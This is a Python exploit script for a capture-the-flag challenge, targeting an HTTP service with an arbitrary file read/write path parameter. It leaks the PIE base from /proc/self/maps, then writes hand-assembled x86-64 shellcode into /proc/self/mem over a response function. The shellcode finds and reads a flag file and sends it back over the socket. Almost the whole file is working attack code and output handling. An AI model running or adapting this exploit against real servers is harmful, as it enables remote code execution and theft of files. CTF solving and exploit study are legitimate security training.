#!/usr/bin/env python3
"""
NS3 CTF Exploit
Vulnerability: Arbitrary file read + write via path parameter
Strategy:
  1. GET /proc/self/maps -> leak PIE base
  2. PUT /proc/self/mem at send_response offset -> overwrite with shellcode
  3. Shellcode executes: getdents("/") to find flag-*, read it, write to socket
"""

import socket
import sys
import re
import time

HOST = "challenges.1pc.tf"
PORT = 38761

# send_response offset in the PIE binary
SEND_RESPONSE_OFFSET = 0x22d4c

# Shellcode: getdents("/"), find "flag-*", read it, write to client_fd
# client_fd is received in esi (2nd arg to send_response)
SHELLCODE = (
    b"\x41\x89\xf7"                    # mov r15d, esi  (save client_fd)
    b"\x48\x81\xec\x30\x11\x00\x00"    # sub rsp, 0x1130 (stack buf)
    # openat(AT_FDCWD, "/", O_RDONLY|O_DIRECTORY, 0)
    b"\xb8\x01\x01\x00\x00"            # mov eax, 257 (SYS_openat)
    b"\xbf\x9c\xff\xff\xff"            # mov edi, -100 (AT_FDCWD)
    b"\x48\x8d\x35\x0a\x01\x00\x00"    # lea rsi, [rip+0x10a] -> "/"
    b"\xba\x00\x00\x01\x00"            # mov edx, 0x10000 (O_DIRECTORY)
    b"\x45\x31\xd2"                    # xor r10d, r10d
    b"\x0f\x05"                        # syscall
    b"\x41\x89\xc4"                    # mov r12d, eax (dir_fd)
    # getdents64(dir_fd, buf, 4096)
    b"\xb8\xd9\x00\x00\x00"            # mov eax, 217 (SYS_getdents64)
    b"\x44\x89\xe7"                    # mov edi, r12d
    b"\x48\x89\xe6"                    # mov rsi, rsp (buf)
    b"\xba\x00\x10\x00\x00"            # mov edx, 4096
    b"\x0f\x05"                        # syscall
    b"\x49\x89\xc5"                    # mov r13, rax (bytes)
    # close(dir_fd)
    b"\xb8\x03\x00\x00\x00"            # mov eax, 3
    b"\x44\x89\xe7"                    # mov edi, r12d
    b"\x0f\x05"                        # syscall
    # Search loop
    b"\x4d\x31\xf6"                    # xor r14, r14 (offset)
    # search_loop:
    b"\x4d\x39\xee"                    # cmp r14, r13
    b"\x0f\x8d\xb3\x00\x00\x00"        # jge not_found
    b"\x4a\x8d\x7c\x34\x13"            # lea rdi, [rsp+r14+19] (d_name)
    # Check "flag-"
    b"\x80\x3f\x66"                    # cmp byte [rdi], 'f'
    b"\x0f\x85\x97\x00\x00\x00"        # jne next_entry
    b"\x80\x7f\x01\x6c"                # cmp byte [rdi+1], 'l'
    b"\x0f\x85\x8d\x00\x00\x00"        # jne next_entry
    b"\x80\x7f\x02\x61"                # cmp byte [rdi+2], 'a'
    b"\x0f\x85\x83\x00\x00\x00"        # jne next_entry
    b"\x80\x7f\x03\x67"                # cmp byte [rdi+3], 'g'
    b"\x75\x7d"                        # jne next_entry
    b"\x80\x7f\x04\x2d"                # cmp byte [rdi+4], '-'
    b"\x75\x77"                        # jne next_entry
    # Found! Build path "/flag-..."
    b"\x48\x8d\xb4\x24\x00\x10\x00\x00"  # lea rsi, [rsp+4096]
    b"\xc6\x06\x2f"                    # mov byte [rsi], '/'
    b"\x48\x8d\x56\x01"                # lea rdx, [rsi+1]
    b"\xb9\xc8\x00\x00\x00"            # mov ecx, 200
    # copy_loop:
    b"\x8a\x07"                        # mov al, [rdi]
    b"\x88\x02"                        # mov [rdx], al
    b"\x84\xc0"                        # test al, al
    b"\x74\x0a"                        # jz open_flag
    b"\x48\xff\xc7"                    # inc rdi
    b"\x48\xff\xc2"                    # inc rdx
    b"\xff\xc9"                        # dec ecx
    b"\x75\xee"                        # jne copy_loop
    # open_flag:
    b"\xb8\x01\x01\x00\x00"            # mov eax, 257 (SYS_openat)
    b"\xbf\x9c\xff\xff\xff"            # mov edi, -100
    b"\x48\x8d\xb4\x24\x00\x10\x00\x00"  # lea rsi, [rsp+4096]
    b"\x31\xd2"                        # xor edx, edx
    b"\x45\x31\xd2"                    # xor r10d, r10d
    b"\x0f\x05"                        # syscall
    b"\x41\x89\xc4"                    # mov r12d, eax
    # read flag
    b"\x31\xc0"                        # xor eax, eax (SYS_read)
    b"\x44\x89\xe7"                    # mov edi, r12d
    b"\x48\x89\xe6"                    # mov rsi, rsp
    b"\xba\x00\x10\x00\x00"            # mov edx, 4096
    b"\x0f\x05"                        # syscall
    b"\x49\x89\xc5"                    # mov r13, rax
    # close flag
    b"\xb8\x03\x00\x00\x00"            # mov eax, 3
    b"\x44\x89\xe7"                    # mov edi, r12d
    b"\x0f\x05"                        # syscall
    # write to socket
    b"\xb8\x01\x00\x00\x00"            # mov eax, 1 (SYS_write)
    b"\x44\x89\xff"                    # mov edi, r15d (client_fd)
    b"\x48\x89\xe6"                    # mov rsi, rsp
    b"\x4c\x89\xea"                    # mov rdx, r13
    b"\x0f\x05"                        # syscall
    # exit
    b"\xb8\x3c\x00\x00\x00"            # mov eax, 60
    b"\x31\xff"                        # xor edi, edi
    b"\x0f\x05"                        # syscall
    # next_entry:
    b"\x42\x0f\xb7\x44\x34\x10"        # movzx eax, word [rsp+r14+16]
    b"\x49\x01\xc6"                    # add r14, rax
    b"\xe9\x44\xff\xff\xff"            # jmp search_loop
    # not_found:
    b"\xb8\x01\x00\x00\x00"            # mov eax, 1
    b"\x44\x89\xff"                    # mov edi, r15d
    b"\x48\x8d\x35\x12\x00\x00\x00"    # lea rsi, [rip+0x12] -> errmsg
    b"\xba\x0f\x00\x00\x00"            # mov edx, 15
    b"\x0f\x05"                        # syscall
    b"\xb8\x3c\x00\x00\x00"            # mov eax, 60
    b"\x31\xff"                        # xor edi, edi
    b"\x0f\x05"                        # syscall
    # Data
    b"/\x00"                           # slash string
    b"FLAG NOT FOUND\n"                # errmsg
)


def http_get(sock, path):
    """Send a GET request and return the body"""
    req = f"GET /?path={path} HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n"
    sock.sendall(req.encode())
    
    # Read response headers
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            raise Exception("Connection closed while reading headers")
        response += chunk
    
    header_end = response.index(b"\r\n\r\n")
    headers = response[:header_end].decode()
    body_start = header_end + 4
    
    # Parse Content-Length
    m = re.search(r'Content-Length:\s*(\d+)', headers, re.IGNORECASE)
    if not m:
        raise Exception(f"No Content-Length in response: {headers}")
    content_length = int(m.group(1))
    
    # Read remaining body
    body = response[body_start:]
    while len(body) < content_length:
        chunk = sock.recv(4096)
        if not chunk:
            break
        body += chunk
    
    return headers, body[:content_length]


def http_put(sock, path, offset, body_data):
    """Send a PUT request with binary body"""
    req = (
        f"PUT /?path={path}&offset={offset} HTTP/1.1\r\n"
        f"Host: x\r\n"
        f"Content-Length: {len(body_data)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body_data
    sock.sendall(req)


def main():
    host = HOST
    port = PORT
    
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    elif len(sys.argv) == 2:
        if ":" in sys.argv[1]:
            host, port = sys.argv[1].rsplit(":", 1)
            port = int(port)
    
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Shellcode size: {len(SHELLCODE)} bytes")
    print(f"[*] send_response offset: {hex(SEND_RESPONSE_OFFSET)}")
    
    # Step 1: Connect
    print("[*] Connecting...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((host, port))
    print("[+] Connected!")
    
    # Step 2: Read /proc/self/maps to find PIE base
    print("[*] Reading /proc/self/maps...")
    headers, maps_data = http_get(sock, "/proc/self/maps")
    maps_text = maps_data.decode('utf-8', errors='replace')
    print(f"[*] Got {len(maps_data)} bytes of maps data")
    
    # Find the base address (first mapping, typically the binary's text segment)
    # Look for the executable mapping (r-xp) that contains our binary
    base_addr = None
    for line in maps_text.strip().split('\n'):
        # Example: 5555555a4000-5555557b6000 r-xp 0001a000 ...
        parts = line.split()
        if len(parts) >= 2 and 'r-xp' in parts[1]:
            addr_range = parts[0]
            start_str = addr_range.split('-')[0]
            # The text segment starts at offset 0x1a000 in the binary
            # So base = text_start - 0x1a000
            file_offset = parts[2] if len(parts) > 2 else "0"
            text_start = int(start_str, 16)
            offset = int(file_offset, 16)
            base_addr = text_start - offset
            print(f"[*] Found r-xp mapping: {line.strip()}")
            print(f"[*] PIE base: {hex(base_addr)}")
            break
    
    if base_addr is None:
        # Fallback: use the very first line
        first_line = maps_text.strip().split('\n')[0]
        start_str = first_line.split('-')[0]
        base_addr = int(start_str, 16)
        print(f"[*] Using first mapping as base: {hex(base_addr)}")
    
    target_addr = base_addr + SEND_RESPONSE_OFFSET
    print(f"[*] Target address (send_response): {hex(target_addr)}")
    
    # Print first few lines of maps for debugging
    print("[*] Maps (first 10 lines):")
    for line in maps_text.strip().split('\n')[:10]:
        print(f"    {line.rstrip()}")
    
    # Step 3: Write shellcode to /proc/self/mem
    print(f"[*] Writing shellcode ({len(SHELLCODE)} bytes) to /proc/self/mem @ {hex(target_addr)}...")
    http_put(sock, "/proc/self/mem", target_addr, SHELLCODE)
    
    # Step 4: The PUT handler calls send_response after writing -> shellcode executes!
    # The shellcode will write the flag directly to our socket, then exit.
    print("[*] Shellcode should be executing now...")
    print("[*] Waiting for flag data...")
    
    # Read whatever comes back (could be HTTP response from PUT + raw flag data)
    time.sleep(1)
    
    all_data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            all_data += chunk
    except socket.timeout:
        pass
    except Exception as e:
        print(f"[*] Recv ended: {e}")
    
    sock.close()
    
    print(f"\n[*] Received {len(all_data)} bytes total")
    print(f"[*] Raw data (hex): {all_data[:200].hex()}")
    print(f"[*] Raw data (ascii): {all_data.decode('utf-8', errors='replace')}")
    
    # Try to find flag in the response
    decoded = all_data.decode('utf-8', errors='replace')
    
    # Look for common CTF flag patterns
    flag_patterns = [
        r'C2C\{[^}]+\}',
        r'1PC\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        m = re.search(pattern, decoded)
        if m:
            print(f"\n[+] FLAG FOUND: {m.group(0)}")
            return
    
    # If no flag pattern found, print everything
    print("\n[*] No flag pattern detected. Full response:")
    print(decoded)


if __name__ == "__main__":
    main()
